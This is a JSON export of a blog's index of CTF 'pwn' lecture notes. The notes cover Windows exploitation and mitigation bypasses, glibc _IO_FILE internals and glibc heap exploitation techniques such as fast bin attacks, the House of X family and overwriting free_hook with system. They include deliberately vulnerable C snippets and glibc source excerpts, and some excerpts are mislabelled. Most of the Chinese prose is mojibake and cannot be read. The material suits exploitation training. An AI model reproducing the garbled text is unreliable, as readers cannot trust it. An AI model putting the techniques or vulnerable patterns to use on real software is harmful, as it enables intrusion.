sensitiveï¼‰ï¼šè€ƒè™‘ç¨‹åºè¯­å¥å¯èƒ½çš„æ‰§è¡Œé¡ºåºï¼Œé€šå¸¸éœ€è¦åˆ©ç”¨ç¨‹åºçš„æ§åˆ¶æµå›¾ï¼ˆCFGï¼‰ è·¯å¾„æ•æ„Ÿåˆ†æï¼ˆpath sensitiveï¼‰ï¼šä¸ä»…è€ƒè™‘è¯­å¥çš„å…ˆåé¡ºåºï¼Œè¿˜å¯¹ç¨‹åºæ‰§è¡Œè·¯å¾„æ¡ä»¶åŠ ä»¥åˆ¤æ–­ï¼Œä»¥ç¡®å®šåˆ†æä½¿ç”¨çš„è¯­å¥åºåˆ—æ˜¯å¦å¯¹åº”ç€ä¸€æ¡å¯å®é™…è¿è¡Œçš„ç¨‹åºæ‰§è¡Œè·¯å¾„ æ ¹æ®åˆ†æè·¯å¾„çš„æ·±åº¦åˆ†ç±» è¿‡ç¨‹å†…åˆ†æï¼ˆintraprocedure analysisï¼‰ï¼šæŒ‡é’ˆå¯¹ç¨‹åºä¸­å‡½æ•°å†…çš„ä»£ç  è¿‡ç¨‹é—´åˆ†æï¼ˆinter-procedure analysisï¼‰ï¼šè€ƒè™‘å‡½æ•°ä¹‹é—´çš„æ•°æ®æµï¼Œå³éœ€è¦è·Ÿè¸ªåˆ†æç›®æ ‡æ•°æ®åœ¨å‡½æ•°ä¹‹é—´çš„ä¼ é€’è¿‡ç¨‹ æ¼æ´å®¡è®¡ç”±äºä¸€äº›ç¨‹åºæ¼æ´çš„ç‰¹å¾å¯ä»¥è¡¨ç°ä¸ºç‰¹å®šç¨‹åºå˜é‡åœ¨ç‰¹å®šçš„ç¨‹åºç‚¹ä¸Šçš„æ€§è´¨ã€çŠ¶æ€æˆ–å–å€¼ä¸æ»¡è¶³ç¨‹åºå®‰å…¨çš„è§„å®šï¼Œå› æ­¤æ•°æ®æµåˆ†æå¯ä»¥ç›´æ¥ç”¨äºæ£€æµ‹è¿™äº›æ¼æ´ æ¼æ´åˆ†æè§„åˆ™ç¨‹åºæ¼æ´é€šå¸¸å’Œç¨‹åºä¸­å˜é‡çš„çŠ¶æ€æˆ–è€…å˜é‡çš„å–å€¼ç›¸å…³ã€‚çŠ¶æ€è‡ªåŠ¨æœºå¯ä»¥æè¿°å’Œç¨‹åºå˜é‡çŠ¶æ€ç›¸å…³çš„æ¼æ´åˆ†æè§„åˆ™ï¼Œè‡ªåŠ¨æœºçš„çŠ¶æ€å’Œå˜é‡ç›¸åº”çš„çŠ¶æ€å¯¹åº”ã€‚å’Œå˜é‡å–å€¼ç›¸å…³çš„æ£€æµ‹è§„åˆ™é€šå¸¸åŒ…å«å’Œç¨‹åºè¯­å¥æˆ–è€…æŒ‡ä»¤ç›¸å…³çš„å¯¹å˜é‡å–å€¼çš„è®°å½•è§„åˆ™ä»¥åŠåœ¨ç‰¹å®šæƒ…å†µä¸‹å˜é‡å–å€¼éœ€è¦æ»¡è¶³çš„çº¦æŸæ¡ä»¶ã€‚ Symbolic ExecutionA system walks through all possible paths of a program. AngrPinFuzzingetc","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"XMan PWNï¼ˆå››ï¼‰","slug":"XMan-PWNï¼ˆå››ï¼‰","date":"2018-08-08T06:17:21.000Z","updated":"2018-10-07T13:04:21.890Z","comments":true,"path":"2018/08/08/XMan-PWNï¼ˆå››ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/08/XMan-PWNï¼ˆå››ï¼‰/","excerpt":"NONICKå¸ˆå‚…ç¥ä»™ä¸Šè¯¾ï¼Œwinä¸‹çš„pwnæ˜¯çœŸçš„éš¾ã€‚","text":"NONICKå¸ˆå‚…ç¥ä»™ä¸Šè¯¾ï¼Œwinä¸‹çš„pwnæ˜¯çœŸçš„éš¾ã€‚ BasicsSome Tools IDA Pro X64 DBG WinDBG Mona PE Format PE Header IATï¼ˆImport Address Tableï¼‰ EATï¼ˆExport Address Tableï¼‰ Section Table PE Memory Layout Basic DLLS NTDLL.DLL Kernel32.dll User32.dll Msvcrtxxx.dll Common vulnerability123456789101112void *GetInput(char *out)&#123; char *p = (char *)malloc(0x20); DWORD readed = 0; HANDLE hin = GetStdHandle(STD_INPUT_HANDLE); // Heap overflow ReadFile(hin, p, 0x200, &amp;readed, 0); // Stack overflow memcpy(out, p, readed); // Generate an exception free(p);&#125; Stack Overflow SEHOnly in x86, it sucks in x64. https://www.52pojie.cn/thread-630505-1-1.html Heap Overflow Mitigation: Encoded function pointer, block header, subsegment header. Low fragment heap(LFH), randomize all heap allocation, enabled by default. Guard pages. Other vulnerabilitiesLFH Bypass Alloc within 18 times Alloc size &gt; 16k Heap spray Low fragment heap Use-After-Free in a nutshell123456789101112131415161718192021222324252627while(true)&#123; if(cn) cn-&gt;hi(); // use-after-free switch(menu()) &#123; case 1: &#123; cn = new CName(tmpname); break; &#125; case 2: &#123; if(cn) delete cn; // double free break; &#125; case 3: &#123; char *comment = new char[72]; cin.getline(comment, 72); break; &#125; default: ExitProcess(0); &#125;&#125; Crash-After-Usepwn the vtable Mitigation &amp; BypassASLR &amp; DEP ASLR Software DEP Hardware DEp SafeSEH &amp; SEHOP SEHOP Bypass method 1: Somehow leak the pointer at stack Bypass method 2: If program doesnâ€™t use ASLR, just copy the stack address CFG ntdll - NtContinue Exploit non-CFG module Overwrite Guard CF Check Function Pointer Real vulnerabilityCVE-2017-11882","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"XMan PWNï¼ˆä¸‰ï¼‰","slug":"XMan-PWNï¼ˆä¸‰ï¼‰","date":"2018-08-07T00:55:00.000Z","updated":"2018-10-07T12:58:31.370Z","comments":true,"path":"2018/08/07/XMan-PWNï¼ˆä¸‰ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/07/XMan-PWNï¼ˆä¸‰ï¼‰/","excerpt":"lowkeyå¸ˆå‚…æ•™_IO_FILEåˆ©ç”¨ã€‚","text":"lowkeyå¸ˆå‚…æ•™_IO_FILEåˆ©ç”¨ã€‚ è¿˜æ˜¯è¦å¥½å¥½çœ‹glibcæºç ï¼Œè¿™é‡Œæœ€é‡è¦çš„æ˜¯/libio/libio.hã€‚ WHAT is _IO_FILE123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; _IO_FILE structures All the FILE structures will be linked in a linked list The head is the _IO_LIST_ALL, we can go through all the FILE structures with this linked list head Three FILE structures will be opened automatically stdin, stdout, stderr saved in the rw- section of libc in the memory struct _IO_FILE *_chain _IO_FILE_plus structures12345struct _IO_FILE_plus&#123; FILE file; const struct _IO_jump_t *vtable;&#125;; vtable is a _IO_jump_t pointer, some std I/O functions will use these pointers. fread fwrite fopen fclose printf/puts fread1234567891011121314151617_IO_size_t_IO_fread (buf, size, count, fp) void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE *fp;&#123; _IO_size_t bytes_requested = size * count; _IO_size_t bytes_read; CHECK_FILE (fp, 0); if (bytes_requested == 0) return 0; _IO_acquire_lock (fp); bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); _IO_release_lock (fp); return bytes_requested == bytes_read ? count : bytes_read / size;&#125; buffer =&gt; save data size =&gt; size of each object count =&gt; how many objects stream =&gt; file stream return value =&gt; readed objects fwrite12345678910111213141516171819202122232425_IO_size_t_IO_fwrite (buf, size, count, fp) const void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE *fp;&#123; _IO_size_t request = size * count; _IO_size_t written = 0; CHECK_FILE (fp, 0); if (request == 0) return 0; _IO_acquire_lock (fp); if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1) written = _IO_sputn (fp, (const char *) buf, request); _IO_release_lock (fp); /* We have written all of the input in case the return value indicates this or EOF is returned. The latter is a special case where we simply did not manage to flush the buffer. But the data is in the buffer and therefore written as far as fwrite is concerned. */ if (written == request || written == EOF) return count; else return written / size;&#125; buffer =&gt; write data size =&gt; size of each object counts =&gt; num of objects stream =&gt; file stream pointer return value =&gt; num of written objects fopen123456/* Open a file and create a new stream for it. This function is a possible cancellation point and therefore not marked with __THROW. */extern FILE *fopen (const char *__restrict __filename, const char *__restrict __modes) __wur; filename =&gt; target file type =&gt; open type(r/w/x) return value =&gt; file pointer fclose12345/* Close STREAM. This function is a possible cancellation point and therefore not marked with __THROW. */extern int fclose (FILE *__stream); Close a file stream, output the rest of data in the buffer area to the drive unlink the fp from the linked list call _IO_file_close_it to close the fp _IO_FINISH(fp) printf/puts1234567891011121314151617int_IO_puts (str) const char *str;&#123; int result = EOF; _IO_size_t len = strlen (str); _IO_acquire_lock (_IO_stdout); if ((_IO_vtable_offset (_IO_stdout) != 0 || _IO_fwide (_IO_stdout, -1) == -1) &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len &amp;&amp; _IO_putc_unlocked ('\\n', _IO_stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (_IO_stdout); return result;&#125; _IO_puts _IO_sputn _IO_new_file_xsputn write SOME challengesexample1","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"XMan PWNï¼ˆäºŒï¼‰","slug":"XMan-PWNï¼ˆäºŒï¼‰","date":"2018-08-06T02:53:04.000Z","updated":"2018-10-07T13:02:48.557Z","comments":true,"path":"2018/08/06/XMan-PWNï¼ˆäºŒï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/06/XMan-PWNï¼ˆäºŒï¼‰/","excerpt":"toxicå°å§å§è®²çš„å¾ˆå¥½ï¼Œæ˜¯æˆ‘å¤ªèœäº†ã€‚","text":"toxicå°å§å§è®²çš„å¾ˆå¥½ï¼Œæ˜¯æˆ‘å¤ªèœäº†ã€‚ å †è¿™ä¸€å—éœ€è¦å¯¹glibcæºç ä¸­/malloc/malloc.cæœ‰ä¸€å®šçš„ç†Ÿæ‚‰ã€‚ linuxå †ç®¡ç†åŸºç¡€ ä¸€å—å†…å­˜ å‡ ç§æ•°æ®ç»“æ„ ä¸€äº›å®‰å…¨æœºåˆ¶ åŠ¨æ€åˆ†é…å’Œå›æ”¶ æé«˜åˆ©ç”¨ç‡ å‡å°‘ç¢ç‰‡åŒ– heap allocatorç®¡ç†å †çš„åˆ†é…å’Œå›æ”¶ å‡å°‘ç³»ç»Ÿè°ƒç”¨æ¬¡æ•° æé«˜æ•ˆç‡ ptmalloc2 - glibcä¸»è¦ç»“æ„ï¼šchunkã€binã€arena binsç®¡ç†ç©ºé—²å †å— arenaè®°å½•åˆ†é…ä¿¡æ¯ chunk heapåŸºæœ¬ç»„æˆæ˜¯chunk Allocated chunk/Free chunk 123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; allocated chunkchunk sizeï¼šåŒ…å«äº†å †å¤´éƒ¨ ç”±äºå¯¹é½é—®é¢˜ï¼Œsizeä½3ä½æ’ä¸º0ï¼Œç”¨ä½œæ ‡è¯†ä½ï¼š Nï¼š1/0ï¼Œå½“å‰chunkæ˜¯å¦ä¸ºthread arena Mï¼š1/0ï¼Œæ˜¯å¦mmapedåˆ†é… Pï¼š1/0ï¼Œå‰ä¸€ä¸ªchunkæ˜¯å¦ä½¿ç”¨ä¸­ prev_sizeï¼šå‰ä¸€ä¸ªç›¸é‚»å—å¤§å° å‰ä¸€ä¸ªå—freeæ—¶æœ‰æ„ä¹‰ å‰ä¸€ä¸ªå—allocatedæ—¶å¯ä»¥ç©ºé—´å¤ç”¨ä¸ºæ•°æ®ç©ºé—´ free chunk fdï¼šæŒ‡å‘freelistä¸­çš„ä¸‹ä¸€ä¸ªå— bkï¼šæŒ‡å‘freelistä¸­çš„ä¸Šä¸€ä¸ªå— fd_nextsizeï¼šæŒ‡å‘freelistä¸­çš„ä¸‹ä¸€ä¸ªlarge chunk bk_nextsizeï¼šæŒ‡å‘freelistä¸­çš„ä¸Šä¸€ä¸ªlarge chunk PSï¼šfd_nextsizeå’Œbk_nextsizeåªèƒ½åœ¨large bin chunkä¸­ä½¿ç”¨ã€‚ top chunkç¬¬ä¸€ä¸ªmallocå®Œæˆæ—¶ï¼Œtop chunkå°±å­˜åœ¨äº†ã€‚ ä¹‹åå¦‚æœæ‰€æœ‰çš„binséƒ½ä¸èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚ï¼Œåˆ™ä»top chunkä¸­åˆ‡å‡ºä¸€å—è¿”å›ï¼Œå‰©ä¸‹çš„å—åˆ™ä¸ºæ–°çš„top chunkã€‚ binsç”¨æ¥ç®¡ç†ç©ºé—´å— - é“¾è¡¨ç»“æ„ ä¸åŒå¤§å°çš„free chunkå±äºä¸åŒçš„binã€‚ fast bins unsorted bin small bins large bins fast binsç®¡ç†free fast bin chunk - å•é“¾è¡¨ç»“æ„ - FILO æ€»å…±æœ‰10ä¸ªbinsï¼Œæ¯ä¸ªbinä¸­chunkå¤§å°ä¸€æ ·ï¼ŒèŒƒå›´ï¼š0x20ï½0x80ï¼ˆ64bitï¼‰ï¼Œ0x10é€’å¢ã€‚ ä»è¢«æ ‡è®°ä¸ºpre inuseä½ï¼Œä¸ä¼šè¿›è¡Œåˆå¹¶ã€‚ å®é™…ä¸Šæœ€å3ä¸ªå¹¶ä¸ä½¿ç”¨ã€‚ unsorted binç®¡ç†unsorted chunk - åŒå‘å¾ªç¯é“¾è¡¨ - FIFO åªæœ‰ä¸€ä¸ªbinï¼Œbinä¸­chunkå¤§å°ä¸ä¸€æ · é™¤fast chunkä¹‹å¤–çš„chunkè¢«freeæ—¶éƒ½ä¼šå…ˆæ”¾è¿›unsorted binï¼Œç±»ä¼¼äºç¼“å­˜ small binç®¡ç†small chunk - åŒå‘å¾ªç¯é“¾è¡¨ - FIFO å…±62ä¸ªbinsï¼Œæ¯ä¸ªbinä¸­chunkå¤§å°ä¸€æ ·ï¼ŒèŒƒå›´ï¼š0x20ï½0x400ï¼ˆ64bitï¼‰ï¼Œ0x10é€’å¢ã€‚ large binç®¡ç†large chunk - åŒå‘å¾ªç¯é“¾è¡¨ - FIFO å…±63ä¸ªbinsï¼ŒåŒä¸€ä¸ªbinä¸­çš„chunkå¤§å°å¯ä»¥ä¸ä¸€æ ·ï¼Œä½†åœ¨æŸä¸ªèŒƒå›´å†…ï¼ˆå¤§äº0x400ï¼ˆ64bitï¼‰ï¼‰ï¼ŒæŒ‰ç…§ä»å¤§åˆ°å°æ’åˆ—ã€‚ arenaç”¨äºç®¡ç†bins main_arenaï¼šç”±ä¸»çº¿ç¨‹åˆ›å»ºthread_arenaï¼šç”±å…¶ä»–çº¿ç¨‹åˆ›å»º arenaæ•°é‡æœ‰é™ï¼š x86ï¼š2 * cores + 1 x64ï¼š8 * cores + 1 å¯¹åº”çš„æ•°æ®ç»“æ„ - malloc_state 12345678910111213141516171819202122232425262728293031323334353637383940414243struct malloc_state&#123; /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; mutexï¼šç”¨äºå¤šçº¿ç¨‹æ”¯æŒ flagdï¼šç”¨äºæ ‡è¯†è¯¥arenaçš„æ€§è´¨ fastbinsY[NFASTBINS]ï¼šfastbinæŒ‡é’ˆæ•°ç»„ topï¼šæŒ‡å‘top chunkçš„æŒ‡é’ˆ Bins[NBINS * 2 - 2]ï¼šbinsæ•°ç»„æŒ‡é’ˆ *nextï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªarenaï¼Œæ„æˆä¸€ä¸ªå¾ªç¯å•å‘åˆ—è¡¨ *next_freeï¼šæŒ‡å‘idle arenaï¼Œä¾¿äºçº¿ç¨‹å¿«é€ŸåŒ¹é… what glibc do when malloc è®¡ç®—çœŸæ­£çš„å †å—å¤§å°ï¼ˆç”¨æˆ·ç”³è¯· + å †å¤´ =&gt; å¯¹é½ï¼‰ æ˜¯å¦åœ¨fast binèŒƒå›´å†… æ˜¯ =&gt; æ£€æŸ¥å¯¹åº”çš„binæ˜¯å¦æœ‰chunk æ˜¯ =&gt; ä»binä¸­å–ä¸‹chunkè¿”å›ç»™ç¨‹åºï¼Œå®Œæˆ æ˜¯å¦åœ¨small binèŒƒå›´å†… æ˜¯ =&gt; æ£€æŸ¥å¯¹åº”çš„binæ˜¯å¦æœ‰chunk æ˜¯ =&gt; ä»binä¸­å–ä¸‹chunkè¿”å›ç»™ç¨‹åºï¼Œå®Œæˆ unsorted biné‡Œæ˜¯å¦æœ‰chunk æœ‰ =&gt; ä»å°¾éƒ¨å–å‡ºç¬¬ä¸€ä¸ªchunkï¼Œå¤§å°æ˜¯å¦æ»¡è¶³åˆ†é…éœ€æ±‚ æ˜¯ =&gt; å‰©ä½™å¤§å°æ˜¯å¦å¤§äºMINSIZE æ˜¯ =&gt; åˆ‡åˆ†å—ï¼Œè¿”å›ç»™ç”¨æˆ·ï¼ŒæŠŠå‰©ä½™çš„å—æ”¾å…¥unsorted binï¼Œå®Œæˆ å¦ =&gt; ä»unsorted binä¸­å–ä¸‹è¯¥å—å¹¶è¿”å›ï¼Œå®Œæˆ æ—  =&gt; æŠŠè¿™ä¸ªå—æ”¾åˆ°å¯¹åº”çš„small/large binsï¼Œéå†ä¸‹ä¸€å— æ˜¯å¦åœ¨large binèŒƒå›´å†… æ˜¯ =&gt; æ£€æŸ¥å¯¹åº”çš„binæ˜¯å¦æœ‰chunk æœ‰ =&gt; æ‰¾åˆ°æ»¡è¶³éœ€æ±‚çš„æœ€å°çš„chunkï¼Œåˆ‡åˆ†å—å¹¶è¿”å›ï¼ŒæŠŠå‰©ä½™çš„å—æ”¾å…¥unsorted binï¼Œå®Œæˆ å†æ¬¡æµè§ˆæ‰€æœ‰çš„small/large binsæ¥æ‰¾åˆ°best-fitçš„chunk ä½¿ç”¨top chunk ç³»ç»Ÿè°ƒç”¨æ‰©å¤§å †ç©ºé—´ what glibc do when free freeçš„chunkå¤§å°æ˜¯å¦å±äºfast bin æ˜¯ =&gt; ç›´æ¥é“¾å…¥å¯¹åº”çš„fast binä¸­ï¼Œä¸æ”¹å˜ä¸‹ä¸€å †å—çš„prev inuseæ ‡å¿—ä½ æ˜¯å¦é€šè¿‡mmappedåˆ†é… æ˜¯ =&gt; ç”¨munmapå›æ”¶ å‰ä¸€ä¸ªç›¸é‚»çš„chunkæ˜¯å¦ç©ºé—² æ˜¯ =&gt; å’Œå‰ä¸€ä¸ªå †å—åˆå¹¶ åä¸€ä¸ªç›¸é‚»chunkæ˜¯å¦æ˜¯top chunk æ˜¯ =&gt; å’Œtop chunkåˆå¹¶ åä¸€ä¸ªç›¸é‚»çš„chunkæ˜¯å¦ç©ºé—² æ˜¯ =&gt; å’Œåä¸€ä¸ªå—åˆå¹¶ é“¾å…¥unsorted bin å¸¸è§å †æ¼æ´chunk overflow ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„sizeã€æ ‡å¿—ä½ã€fd/bkæŒ‡é’ˆç­‰ ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„ç”¨æˆ·æ•°æ®ã€egæŒ‡é’ˆç­‰ use after freeä¸€ä¸ªå†…å­˜å¿«è¢«é‡Šæ”¾åå†æ¬¡ä½¿ç”¨ã€‚ é‡Šæ”¾åæŒ‡é’ˆæ²¡æœ‰è¢«ç½®ä¸ºNULL å†…å­˜æ•°æ®æ²¡æœ‰è¢«æ¸…ç† double free UAFï¼ˆuse after freeï¼‰çš„ä¸€ä¸ªç‰¹ä¾‹ æŠŠå·²ç»freeè¿‡çš„å—å†freeä¸€æ¬¡ éœ€è¦ç»•è¿‡glibcä¸­å¯¹äºdouble freeçš„æ£€æŸ¥ï¼š 1234567891011121314151617181920if (SINGLE_THREAD_P) &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (\"double free or corruption (fasttop)\"); p-&gt;fd = old; *fb = p; &#125; else do &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (\"double free or corruption (fasttop)\"); p-&gt;fd = old2 = old; &#125; while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); unlinkfree chunkçš„æ—¶å€™å †å—å‰å‘ã€åå‘åˆå¹¶ï¼Œå°†ä½¿ç”¨unlinkã€‚ 1234567891011121314151617181920212223242526272829303132/* Take a chunk off a bin list */#define unlink(AV, P, BK, FD) &#123; \\ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\"); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ if (!in_smallbin_range (chunksize_nomask (P)) \\ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \\ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \\ malloc_printerr (\"corrupted double-linked list (not small)\"); \\ if (FD-&gt;fd_nextsize == NULL) &#123; \\ if (P-&gt;fd_nextsize == P) \\ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \\ else &#123; \\ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \\ &#125; \\ &#125; else &#123; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ &#125; \\ &#125; \\ &#125; \\&#125; ç°åœ¨å¯¹unlinkä¹Ÿæœ‰æ£€æŸ¥ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr (\"malloc(): smallbin double linked list corrupted\"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; off by oneåªèƒ½æº¢å‡ºä¸€ä¸ªå­—èŠ‚ã€‚ æ”¹å†™ä¸‹ä¸€ä¸ªå—çš„size æ”¹å†™ä¸‹ä¸€ä¸ªå—çš„prev inuseä½ =&gt; unlink=&gt; chunk overlap CTFä¸­å †çš„å¸¸è§æ”»å‡»æ‰‹æ³•fast bin attackæ§åˆ¶fdæŒ‡é’ˆ UAFï¼šdirectly corrupted fd Double freeï¼šfast bin dup Sizeæ£€æŸ¥ï¼šé“¾è¡¨ä¸­ç¬¬ä¸€ä¸ªchunkæ˜¯å¦å’Œè¦freeçš„chunkç›¸åŒ åˆ©ç”¨misalignmentä¼ªé€ size =&gt; 0x7fXXXXXXXXXXX Overwrite GOT Overwrite main_arenaï¼ˆalways top chunk ptrï¼‰ Overwrite realloc_hook/malloc_hook/free_hookï¼ˆbut always infeasibleï¼‰ unsorted bin attackä»»æ„åœ°å€å†™å›ºå®šå€¼ æ§åˆ¶bkæŒ‡é’ˆã€bk = addr - 0x10ï¼ˆ64bitï¼‰ mallocä¸€ä¸ªå¤§å°æ­£å¥½çš„å †å— - æœ€ç»ˆè¾¾åˆ°addr = main_arena + 0x58 é€šå¸¸æ”¹å†™global_max_fast small bin attack ä¼ªé€ fake chunkï¼Œè®©å…¶æŒ‡é’ˆæŒ‡å‘victim æ”¹å†™victimçš„bkä¸ºfake chunk æŠŠfake chunkæ”¾å…¥å¯¹åº”çš„small binä¸­ ä¸‹æ¬¡mallocå¯ä»¥åˆ†é…åˆ°fake chunkå¤„ large bin attackå‡ºç°åœ¨unsorted binæ”¾å…¥large binçš„è¿‡ç¨‹ä¸­ æŠŠlarge chunkçš„bk_nextsizeæŒ‡é’ˆæ”¹å†™æˆaddr_a é€šè¿‡mallocæŠŠä¸€ä¸ªæ¯”å½“å‰chunkï¼ˆvictimï¼‰å°çš„å—æ”¾å…¥large binä¸­ addr_a + 0x20å°†è¢«æ”¹å†™æˆvictimæŒ‡é’ˆ House of XXXIncludeï¼š House of Spirit House of Force House of Lore House of Einherjar House of Orange House of Roman House of Spiritfast bin sttack fake a bin chunk æ”¹å†™fast bin chunkçš„fdæŒ‡é’ˆï¼Œè®©å…¶æŒ‡å‘fake chunk mallocä¸¤æ¬¡ï¼Œå¯ä»¥åˆ†é…åˆ°fake chunk House of Forcetop chunk attack Overwrite top chunkâ€™s size Malloc arbitrary size Can malloc twice Loresmall bin sttack æ”¹å†™small bin chunkçš„bkæŒ‡é’ˆï¼Œè®©å…¶æŒ‡å‘fake chunk éœ€è¦æ»¡è¶³bck-&gt;fd==victimçš„æ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯fake chunkçš„æŒ‡é’ˆæŒ‡å‘è¢«æ”¹å†™çš„small bin chunk Einherjaroff by one Fake chunk, fake pre_size Off by null clear next chunkâ€™s pre_in_use bit Could free not fasts bins Orange ä¼ªé€ çš„sizeå¿…é¡»è¦å¯¹é½åˆ°å†…å­˜é¡µ sizeè¦å¤§äºMINSIZEï¼ˆ0x10ï¼‰ sizeè¦å°äºä¹‹åç”³è¯·çš„chunk size + MINSIZE sizeçš„prev inuseä½å¿…é¡»ä¸º1 Romanfast bin attack + unsorted bin attack æ²¡æœ‰æ³„æ¼ Partial write to bypass ASLR tricks æ”¹gotï¼ˆatoiã€freeï¼‰ free_hookæ”¹system malloc_hookæ”¹onegadget åˆ©ç”¨malloc_printererå®ç°one_gadget åˆ©ç”¨misalignmentä¼ªé€ size åˆ©ç”¨fast bin attackåœ¨main arenaå†™size åˆ©ç”¨fast bin attackæ”¹å†™top chunk ptr summary æ”¹å†™å…³é”®æ•°æ®ç»“æ„ 